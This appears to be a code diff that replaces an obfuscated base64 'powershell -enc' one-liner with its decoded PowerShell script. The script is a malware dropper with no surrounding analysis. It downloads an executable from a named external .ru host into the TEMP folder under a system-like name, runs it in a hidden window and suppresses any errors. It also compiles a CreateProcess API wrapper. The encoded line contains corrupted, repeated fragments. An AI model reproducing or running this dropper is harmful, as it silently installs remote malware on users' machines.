@@ -1,1 +1,66 @@
-powershell -enc IyBEb3dubG9hZCBhbmQgZXhlY3V0ZSBhbiBleGVjdXRhYmxlIGZpbGUgZnJvbSBhIHNwZWNpZmllZCBVUkwKJHVybCA9ICJodHRwOi8vYTY2s7MMBf2C8Dro6wBnMQp8fyi7o3cv1juleGUiOwokb3V0cHV0UGF0aCA9ICIkZW52OlRFTY2s7MMBf2C8Dro6wBnMQp8fyi7o3cv1juUgdGhpcyB0byB5b3VyIGRlc2lyZWQgcGF0aAoKdHJ5IHt7CiAgICAjIERvd25sb2FkIHRoZSBleGVjdXRhYmxlIGZpbGUKICAgIEludm9rZS1SZXN0TWV0aG9kIC1VcmkgJHVybCAtT3V0RmlsZSAkb3V0cHV0UGF0aAoKICAgICMgUnVuIHRoZSBkb3dubG9hZGVkIGV4ZWN1dGFibGUgaW4gYSBoaWRkZW4gd2luZG93CiAgICBTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCAkb3V0cHV0UGF0aCAtV2luZG93U3R5bGUgSGlkZGVuCn19IGNhdGNoIHt7CiAgICAjIFN1cHByZXNzaW5nIGVycm9ycywgbm90aGluZyB3aWxsIGJlIG91dHB1dCB0byB0aGUgY29uc29sZQp9fQoKIyBPcHRpb25hbDogSWYgeW91IHdhbnQgdG8gZGVmaW5lIGEgV2luZG93cyBBUEkgZnVuY3Rpb24gZm9yIGZ1dHVyZSB1c2UKJGFkZFR5cGVEZWZpbml0aW9uID0gQCIKdXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CgpwdWJsaWMgY2xhc3MgUHJvY2Vzc0hlbHBlciB7ewogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIENyZWF0ZVByb2Nlc3MoCiAgICAgICAgc3RyaW5nIGxwQXBwbGljYXRpb25OYW1lLAogICAgICAgIHN0cmluZyBscENvbW1hbmRMaW5lLAogICAgICAgIEludFB0ciBscFByb2Nlc3NBdHRyaWJ1dGVzLAogICAgICAgIEludFB0ciBscFRocmVhZEF0dHJpYnV0ZXMsCiAgICAgICAgYm9vbCBiSW5oZXJpdEhhbmRsZXMsCiAgICAgICAgdWludCBkd0NyZWF0aW9uRmxhZ3MsCiAgICAgICAgSW50UHRyIGxwRW52aXJvbm1lbnQsCiAgICAgICAgc3RyaW5nIGxwQ3VycmVudERpcmVjdG9yeSwKICAgICAgICByZWYgU1RBUlRVUElORk8gbHBTY2s7MMBf2C8Dro6wBnMQp8fyi7o3cv1juFJPQ0VTY2s7MMBf2C8Dro6wBnMQp8fyi7o3cv1jumZvcm1hdGlvbik7CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQogICAgcHVibGljIHN0cnVjdCBTY2s7MMBf2C8Dro6wBnMQp8fyi7o3cv1jumxpYyBpbnQgY2I7CiAgICAgICAgcHVibGljIHN0cmluZyBscFJlc2VydmVkOwogICAgICAgIHB1YmxpYyBzdHJpbmcgbHBEZXNrdG9wOwogICAgICAgIHB1YmxpYyBzdHJpbmcgbHBUaXRsZTsKICAgICAgICBwdWJsaWMgaW50IGR3WDsKICAgICAgICBwdWJsaWMgaW50IGR3WTsKICAgICAgICBwdWJsaWMgaW50IGR3WFNpemU7CiAgICAgICAgcHVibGljIGludCBkd1lTY2s7MMBf2C8Dro6wBnMQp8fyi7o3cv1juHdYQ291bnRDaGFyczsKICAgICAgICBwdWJsaWMgaW50IGR3WUNvdW50Q2hhcnM7CiAgICAgICAgcHVibGljIGludCBkd0ZpbGxBdHRyaWJ1dGU7CiAgICAgICAgcHVibGljIGludCBkd0ZsYWdzOwogICAgICAgIHB1YmxpYyBzaG9ydCB3U2hvd1dpbmRvdzsKICAgICAgICBwdWJsaWMgc2hvcnQgY2JSZXNlcnZlZDI7CiAgICAgICAgcHVibGljIEludFB0ciBscFJlc2VydmVkMjsKICAgICAgICBwdWJsaWMgaW50IGR3SGlnaERhdGVUaW1lOwogICAgICAgIHB1YmxpYyBpbnQgZHdMb3dEYXRlVGltZTsKICAgIH19CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQogICAgcHVibGljIHN0cnVjdCBQUk9DRVNTX0lORk9STY2s7MMBf2C8Dro6wBnMQp8fyi7o3cv1juludFB0ciBoUHJvY2VzczsKICAgICAgICBwdWJsaWMgSW50UHRyIGhUaHJlYWQ7CiAgICAgICAgcHVibGljIGludCBkd1Byb2Nlc3NJZDsKICAgICAgICBwdWJsaWMgaW50IGR3VGhyZWFkSWQ7CiAgICB9fQp9fQoiQDsKCiMgQ29tcGlsZSB0aGUgdHlwZSBkZWZpbml0aW9uCkFkZC1UeXBlIC1UeXBlRGVmaW5pdGlvbiAkYWRkVHlwZURlZmluaXRpb24gLUxhbmd1YWdlIENTaGFycA==
+# Download and execute an executable file from a specified URL
+$url = "http://a1067277.xsph.ru/1Elusion.exe";
+$outputPath = "$env:TEMP\\LNsystem.exe" # Change this to your desired path
+
+try {{
+    # Download the executable file
+    Invoke-RestMethod -Uri $url -OutFile $outputPath
+
+    # Run the downloaded executable in a hidden window
+    Start-Process -FilePath $outputPath -WindowStyle Hidden
+}} catch {{
+    # Suppressing errors, nothing will be output to the console
+}}
+
+# Optional: If you want to define a Windows API function for future use
+$addTypeDefinition = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class ProcessHelper {{
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool CreateProcess(
+        string lpApplicationName,
+        string lpCommandLine,
+        IntPtr lpProcessAttributes,
+        IntPtr lpThreadAttributes,
+        bool bInheritHandles,
+        uint dwCreationFlags,
+        IntPtr lpEnvironment,
+        string lpCurrentDirectory,
+        ref STARTUPINFO lpStartupInfo,
+        out PROCESS_INFORMATION lpProcessInformation);
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct STARTUPINFO {{
+        public int cb;
+        public string lpReserved;
+        public string lpDesktop;
+        public string lpTitle;
+        public int dwX;
+        public int dwY;
+        public int dwXSize;
+        public int dwYSize;
+        public int dwXCountChars;
+        public int dwYCountChars;
+        public int dwFillAttribute;
+        public int dwFlags;
+        public short wShowWindow;
+        public short cbReserved2;
+        public IntPtr lpReserved2;
+        public int dwHighDateTime;
+        public int dwLowDateTime;
+    }}
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct PROCESS_INFORMATION {{
+        public IntPtr hProcess;
+        public IntPtr hThread;
+        public int dwProcessId;
+        public int dwThreadId;
+    }}
+}}
+"@;
+
+# Compile the type definition
+Add-Type -TypeDefinition $addTypeDefinition -Language CSharp
